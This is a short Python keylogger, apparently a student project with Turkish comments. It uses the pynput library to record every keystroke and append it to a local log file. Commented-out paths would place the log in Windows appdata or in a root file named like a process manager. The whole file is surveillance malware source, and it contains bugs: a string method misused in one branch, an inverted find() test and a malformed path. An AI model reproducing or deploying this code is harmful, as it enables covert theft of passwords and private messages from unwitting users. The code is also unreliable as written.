import os
from pynput.keyboard import Listener#pynput kütüphanesini klavyeden dinleme için kullanıyoruz.

keys =[]
count = 0
# path = os.environ['appdata']+'C:\Users\sella\PROJE2\logs.txt'  #win de çalıştırmak için
#path = '/root/processmanager.txt' #linuxta çalıştırmak için.

def on_press(key):
   global keys, count #global almamızın sebebi hem fonksiyon içerisinde hem dışında değişkenlerin değerlerini düzgün alabilmek.
   keys.append(key)#keys arrayine basılan key leri append ile ekledik.
   count +=1 #sayacı 1 arttırdık.

   if count >=1: #sayac zaten her fonksiyon çalıştığında 1 artırılacağı için if bloka girer.
      count  = 0 #sayacı sıfırlarız.
      write_file(keys)#ve write_file fonksiyonuna yazılan keys arrayini parametre olarak veririz.
      keys = []#aynı şeyleri tekrar tekrar yazdırmamak adına arrayi temizleriz.



def write_file(keys):
   with open("logs.txt", 'a') as f: # yazılan kayıtları tutan bir dosya oluşturmak için.
      for key in keys:
         k =str(key).replace("'"," ") #bir k değişkeni oluşturduk,değişkene key in stringe dönüştürülmüş halini atadık(sayı da girilebilir)
         if k.find('backspace') > 0:#array içerisinde sayılar 'a','b' etc gibi tutulduğundan replace ile ' karakteri yerine boşluk gelmesini sağladık.
            f.write('Backspace(silindi)')
         elif k.find('enter') > 0:
            f.write('\n')
         elif k.find('shift') > 0:
            f.write('Shift')
         elif k.find('space') > 0:
            f.write('\n')
         elif k.find('caps lock') >0:
            k.write(' caps lock ')
         elif k.find('Key'):#koşullardan hiçbirine basmadıysam sadece yazılan k yi bana göster demiş oluyoruz.
            f.write(k)
         

with Listener(on_press=on_press) as listener: #oluşturduğumuz on_press fonksiyonunu listenera verip çaışmasını sağladık.
   listener.join()